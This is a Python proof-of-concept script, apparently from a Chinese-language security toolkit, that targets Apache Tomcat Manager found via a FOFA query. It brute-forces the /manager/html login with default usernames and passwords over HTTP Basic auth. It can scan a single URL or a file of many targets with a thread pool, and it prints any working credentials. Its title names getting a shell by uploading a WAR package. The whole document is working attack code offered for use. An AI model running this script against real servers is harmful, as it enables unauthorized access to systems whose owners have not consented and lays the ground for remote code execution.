#FOFA: app="tomcat"

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json
import time
import base64

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': 'Tomcat 弱口令(上传war包getshell)',
        'vulnerable': False
    }
    tomcat_users = ['tomcat', 'admin']
    tomcat_passwds = ['tomcat', 'admin', '123456', '']
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Authorization': '',
        }
        vurl = urllib.parse.urljoin(target, '/manager/html')
        rep = requests.get(vurl, timeout=3)
        if re.search('tomcat', rep.text) and 'Apache' in str(rep.headers) and rep.status_code == 401:
            for tomcat_user in tomcat_users:
                for tomcat_passwd in tomcat_passwds:
                    auth = '{0}:{1}'.format(tomcat_user, tomcat_passwd)
                    base64_auth = base64.b64encode(auth.encode('utf-8')).decode('utf-8')
                    headers['Authorization'] = 'Basic {0}'.format(base64_auth)
                    verify_rep = requests.get(vurl, headers=headers, timeout=2)
                    if verify_rep.status_code == 200 and 'Set-Cookie' in str(verify_rep.headers):
                        result['vulnerable'] = True
                        result['url'] = target
                        result['vurl'] = vurl
                        result['user'] = tomcat_user
                        result['password'] = tomcat_passwd
                        print(result)
        print(f"{target}不存在漏洞")
    except:
        print(f"{target}访问失败")

def main():
    parser = argparse.ArgumentParser("Tomcat弱口令漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()